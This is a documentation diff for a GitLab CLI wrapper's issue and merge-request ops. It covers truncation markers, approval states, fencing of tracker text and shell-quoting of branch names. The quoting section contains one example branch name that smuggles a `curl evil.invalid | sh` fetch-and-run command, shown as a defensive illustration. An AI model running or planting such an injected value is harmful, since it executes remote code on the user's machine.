@@ -10,8 +10,8 @@ GitLab ops via the `glab` CLI. Replaces the 3-5 separate `glab` calls needed to 
 
 | Op | Syntax | What it returns |
 |----|--------|-----------------|
-| `gl-issue` | `gl-issue:NUMBER[:full]` | Issue metadata, description, comments (truncated by default), related MRs (first 10). `:full` disables truncation — description, comments **and** the related-MR list. The related-MR cap used to be the half-silent kind ([#635](https://github.com/Digital-Process-Tools/claude-supertool/issues/635)): the total printed correctly above a list of ten, so a reader seeing `Related MRs: 47` over ten rows concluded the numbers were wrong rather than that ten was a ceiling. It now reads `Related MRs: 10 of 47 shown (37 not listed — count limit of 10; use :full for all)`, with the same marker repeated under the list. An uncut list still prints the bare `Related MRs: 3` and nothing else, so the absence of a marker means the list is whole |
-| `gl-mr` | `gl-mr:NUMBER_OR_BRANCH[:status\|:full]` | MR dashboard: branch, pipeline, reviewer/approval state, linked issue, diff stat, per-file name-status (`A`/`D`/`R`/`M`) list, comments. The file list is the high-signal "what got removed?" scan; capped at 50 files by default with a `… +N more` marker. `:status` returns slim merge-state plus the `source -> target` branch line only; `:full` uncaps the file list (paginating up to 500) and the comments. The `Conflicts:` line only says `YES` on positive evidence of an actual diff conflict; an MR blocked because its source branch has no commits prints `Conflicts: NO — cannot merge: source branch has no commits, so there is nothing to merge` instead (same `conflict`/`empty` distinction as `gl-mrs`, #494). A real conflict adds a `## Conflicts` section: the conflicting paths, then a per-file hunk preview (capped at 40 lines each) and the resolve commands. A conflicted **binary** file (image, PDF, font) is still listed and still gets its `###` heading, but the hunks are replaced by `(binary file — conflict hunks not shown; resolve by picking a version)` — `git merge-tree` streams raw blob content, and rendering 40 lines of mojibake helps nobody (#498). When the preview cannot be computed at all — the `git merge-tree` that produces the hunks timed out, exited non-zero, or could not be run — the section says so and names the cause, instead of rendering as a conflict that happens to have no hunks (#507); see [The conflicts section](#the-conflicts-section) |
+| `gl-issue` | `gl-issue:NUMBER[:full]` | Issue metadata, description, comments (truncated by default), related MRs (first 10). `:full` disables truncation — description, comments **and** the related-MR list. The related-MR cap used to be the half-silent kind ([#635](https://github.com/Digital-Process-Tools/claude-supertool/issues/635)): the total printed correctly above a list of ten, so a reader seeing `Related MRs: 47` over ten rows concluded the numbers were wrong rather than that ten was a ceiling. It now reads `Related MRs: 10 of 47 shown (37 not listed — count limit of 10; use :full for all)`, with the same marker repeated under the list. An uncut list still prints the bare `Related MRs: 3` and nothing else, so the absence of a marker means the list is whole. The description is bounded the same way: over `DESCRIPTION_MAX` (3000 chars) it discloses twice — in the header and at the cut — with the exact char count withheld ([#698](https://github.com/Digital-Process-Tools/claude-supertool/issues/698), see [A truncated description says so before you reach it](#a-truncated-description-says-so-before-you-reach-it)) |
+| `gl-mr` | `gl-mr:NUMBER_OR_BRANCH[:status\|:full]` | MR dashboard: branch, pipeline, reviewer/approval state, linked issue, diff stat, per-file name-status (`A`/`D`/`R`/`M`) list, comments. The file list is the high-signal "what got removed?" scan; capped at 50 files by default with a `… +N more` marker. `:status` returns slim merge-state plus the `source -> target` branch line only; `:full` uncaps the file list (paginating up to 500) and the comments — both how many print and, since [#719](https://github.com/Digital-Process-Tools/claude-supertool/issues/719), how much of each, which it had never done. Comments are budgeted by total bytes by default, with an inline `... N more comment(s) hidden (KB). Use gl-mr:N:full for everything.` where the hidden ones were, and a body over 500 chars ends `…[truncated at 500 chars — use :full]`. The `Conflicts:` line only says `YES` on positive evidence of an actual diff conflict; an MR blocked because its source branch has no commits prints `Conflicts: NO — cannot merge: source branch has no commits, so there is nothing to merge` instead (same `conflict`/`empty` distinction as `gl-mrs`, #494). A real conflict adds a `## Conflicts` section: the conflicting paths, then a per-file hunk preview (capped at 40 lines each) and the resolve commands. A conflicted **binary** file (image, PDF, font) is still listed and still gets its `###` heading, but the hunks are replaced by `(binary file — conflict hunks not shown; resolve by picking a version)` — `git merge-tree` streams raw blob content, and rendering 40 lines of mojibake helps nobody (#498). When the preview cannot be computed at all — the `git merge-tree` that produces the hunks timed out, exited non-zero, or could not be run — the section says so and names the cause, instead of rendering as a conflict that happens to have no hunks (#507); see [The conflicts section](#the-conflicts-section). A description over 2000 chars says so twice — in the header and at the cut — naming the exact char count withheld, and `:full` now returns the whole description too ([#698](https://github.com/Digital-Process-Tools/claude-supertool/issues/698), see [A truncated description says so before you reach it](#a-truncated-description-says-so-before-you-reach-it)) |
 | `gl-mrs` | `gl-mrs[:filters,flags]` | MR triage board, sorted failing-first then stalest. Per MR (enriched in parallel): pipeline status (a failure shows the failed **job name** = the failure class), approval state, age, diff size, watch-state cross-reference, and `conflict`/`empty`/`draft`/`threads` flags — plus an actionable footer. "Failing" here means red, not the literal string `failed`: `canceled`, and any pipeline state GitLab adds later, sort first and are matched by the `failed` flag and the footer count. `skipped`/`neutral`/`manual` are the only non-success states treated as benign. Filters (comma-sep): `author`/`reviewer`/`assignee`/`label`/`milestone`/`state`/`per`. Flags: `nopipe` (skip enrichment), `iids` (bare id list), `failed` (only failing). Pipeline status is only known for MRs whose detail lookup actually succeeded, so an MR past `enrich_cap` — or one whose lookup timed out — is **unknown**, never "not failing". The board discloses how many it could not check (`5 of 45 MRs not checked — pipeline status unavailable, so a failing MR among them cannot appear on this board. Enrichment cap is 40; raise SUPERTOOL_ENRICH_CAP=N`) above the table and in the footer, and on `stderr` under `iids` so the id feed stays parseable. The cap is named only when the cap is what cut — below it, the escape it offers would not work. A board with nothing unchecked prints no such marker, which is what makes an empty `:failed` board a real all-clear ([#652](https://github.com/Digital-Process-Tools/claude-supertool/issues/652)) |
 | `gl-pipeline` | `gl-pipeline:NUMBER[:active\|:failed]` | Pipeline job list grouped by stage with pass/fail status and failed job IDs. The default board collapses the `manual`/`created`/`skipped` bulk to a one-line count so the running/done/failed jobs aren't buried. `:active` shows only running/pending jobs ("what's still going"); `:failed` shows only failed jobs plus their job IDs/URLs ("what broke") |
 | `gl-job` | `gl-job:NUMBER[:raw[:-N\|:START[:END]]\|:grep:PATTERN]` | Job failure detail: MR context + error pattern search + log tail. `:raw` dumps the full trace; `:raw:START:END` slices lines (1-indexed, inclusive); `:raw:-N` returns the **last N lines**; a START past the end of the log returns the tail of the width requested and says so, rather than declining (see [Reading a range](#reading-a-range)); `:grep:PATTERN` runs an ad-hoc regex over the trace (literal fallback on bad regex, ±context, names the pattern + tail on no-match — never silent-empty). Cause markers are always matched on top of the configured patterns, and a *failed* job that matches nothing is reported as unclassified with a log tail rather than as "no errors" |
@@ -36,7 +36,39 @@ Same shape as `gh-pr`'s named legs (bounded at 5 per group, `+N more` past that)
 ```bash
 ./supertool 'gl-mr:42'
 ```
-Returns approval state, pipeline status, diff stat, and all comments in one call.
+Returns approval state, pipeline status, diff stat, and the comments in one call — bounded, and saying where it bounded them (see [A truncated description says so before you reach it](#a-truncated-description-says-so-before-you-reach-it)).
+
+### A truncated description says so before you reach it
+
+`gl-issue` caps the description at `DESCRIPTION_MAX` (3000 chars) and `gl-mr` at 2000. Both used to cut with a raw `description[:DESCRIPTION_MAX]` — no marker, no count, and the cut landing wherever the byte count ran out, which in [#681](https://github.com/Digital-Process-Tools/claude-supertool/issues/681)'s repro on the sibling GitHub op was three characters into a heading, printed as `## The` with the next section starting right after. Read top to bottom, a truncated issue looked like a complete one ([#698](https://github.com/Digital-Process-Tools/claude-supertool/issues/698)).
+
+The caps stay — an unbounded render is a context blowout in the caller, a different bug. What changed is that a cut is now visible:
+
+- **The cut lands on a line break**, the last one at-or-before the cap, so the description always ends where a line ended.
+- **The withheld amount is stated in the header**, before `## Description` — `Body: TRUNCATED — N of M chars shown, K withheld — use :full to fetch all` — because the reader this protects is the one who stops at the top.
+- **And again at the point of the cut** — `…[K chars truncated here — use :full to fetch all]` — matching the `## Comments` truncation convention already in both ops.
+
+**`gl-mr:N:full` now uncaps the description too.** It was documented as uncapping the file list and the comments, and the description was capped regardless — so the `:full` the new disclosure points at had to be made true before the disclosure could be honest.
+
+**And it uncaps the comment *bodies*, which it never did either** ([#719](https://github.com/Digital-Process-Tools/claude-supertool/issues/719)). `:full` uncapped how many notes printed; every note was still sliced at `COMMENT_MAX` (500 chars) on the way out, with no marker, on the `:full` path as much as the default one. Two thirds of a documented promise is the escape-hatch problem rather than a smaller version of it. A cut note now ends `…[truncated at 500 chars — use :full]`, the same string `gh-issue`, `gh-pr` and `gl-issue` use, and `:full` returns the bodies whole.
+
+**`gl-mr`'s comment *count* disclosure was already right and was deliberately left alone.** Unlike `gh-pr`, which printed a total above ten of them ([#719](https://github.com/Digital-Process-Tools/claude-supertool/issues/719)), `gl-mr` budgets comments by total bytes, keeps the most recent, and prints an inline gap where the hidden ones were — `... 12 more comment(s) hidden (8.4KB). Use gl-mr:618:full for everything.` That is a different convention from the GitHub ops' `N of M shown` heading because it is bounding a different thing, and converting it would have added a fourth wording, not removed one. A test pins it against exactly that.
+
+The cut and its wording live in `presets/_body.py`, shared with `gh-issue` and `gh-pr`. Four hand-maintained copies of a disclosure is how a fifth site forgets to have one.
+
+### The approvals line, and the linked-issue block
+
+`Approved by:` has three states, not two ([#720](https://github.com/Digital-Process-Tools/claude-supertool/issues/720)):
+
+| Output | Means |
+|--------|-------|
+| `Approved by: alice, bob` | GitLab answered and named them |
+| `Approved by: none` | GitLab answered and the list is empty |
+| `Approved by: UNKNOWN — <reason>` | **nobody asked or nobody answered** — the approval state of this MR is not known |
+
+The third one is new. `GET /projects/:id/merge_requests/:iid/approvals` is documented as returning a JSON **object** carrying `approved_by`, on every tier including Free, so anything else is not GitLab answering — and none of it means nobody approved. Previously each of those cases rendered as one of two wrong things: a non-zero `glab` exit, a timeout or an unparseable body printed **no line at all**, and a body that parsed to anything but an object raised `AttributeError` out of the whole render, taking the sections below it — threads, pipeline, files, description, comments — with it. The reasons are stated verbatim, including `glab`'s own stderr: an unauthenticated CLI now reads `Approved by: UNKNOWN — approvals API failed (glab exit 1: Unauthenticated.)`.
+
+The `## Issue #N` block that follows the conflicts section takes the same treatment, because it had the same two shapes: a failed lookup printed nothing at all, and a non-object payload crashed the render. It now degrades to `Issue: #N — details unavailable (<reason>)`.
 
 ### The conflicts section
 
@@ -72,6 +104,27 @@ The section therefore distinguishes three outcomes, which used to render identic
 ```
 
 The resolve commands print in all three cases; they never needed the hunks.
+
+**Branch names and paths in the resolve block are shell-quoted when they are not ordinary** ([#694](https://github.com/Digital-Process-Tools/claude-supertool/issues/694)). The source branch of a merge request is named by whoever opened it, and git refnames permit `;`, backtick, `$`, `&`, quotes, parentheses and spaces. Supertool does not run this block — it prints it for you or an agent to paste — but "paste this" is close enough to "run this" that the printed line has to be safe.
+
+A name matching `^[A-Za-z0-9._/-]+$` prints bare, so the ordinary block is unchanged:
+
+```
+To resolve:
+  git checkout feat/x && git fetch origin && git merge origin/master
+  git add a.py b.py && git commit && git push
+```
+
+Anything else is quoted, and a line above the block says so:
+
+```
+To resolve:
+  # ⚠ 2 names below contain characters a shell acts on, and have been quoted — read the command before running it.
+  git checkout 'x; curl evil.invalid | sh' && git fetch origin && git merge origin/master
+  git add 'a file.py' && git commit && git push
+```
+
+Option-shaped names (`-B`) are the limit of what quoting reaches: `git checkout '-B'` still reads a flag. They are quoted so they look wrong and named in the warning — git itself refuses to create such a refname, so one arriving from the API is worth stopping over.
 
 **The hunk timeout scales with the conflicted file count** — `max(15s, 5s × files)`, capped at 60s. Wall time here is git's merge computation, not the pipe write, so it tracks how many files git has to merge. 15s is a floor that is generous for one conflicted text file and thin for a dozen files or a cold object cache — which is where the preview is worth the most.
 
@@ -251,6 +304,10 @@ Gets the full issue context and checks whether an MR already exists for the bran
 ./supertool 'gl-mrs:author=@me,failed,iids'   # bare ids of my failing MRs
 ```
 The last form feeds the [`watch`](watch.md) supervisor: pipe failing-MR ids straight into background pollers.
+
+### Text from the tracker is fenced
+
+Issue and MR descriptions and every comment are wrapped in `⟨remote NONCE⟩ … ⟨/remote NONCE⟩` markers, and one-line fields (titles, usernames, labels, branch names) are flattened to a single line. See [Remote text is fenced](index.md#remote-text-is-fenced) for the convention, what it costs, and why the fence cannot be closed from inside ([#694](https://github.com/Digital-Process-Tools/claude-supertool/issues/694)).
 
 ## Configuration
 
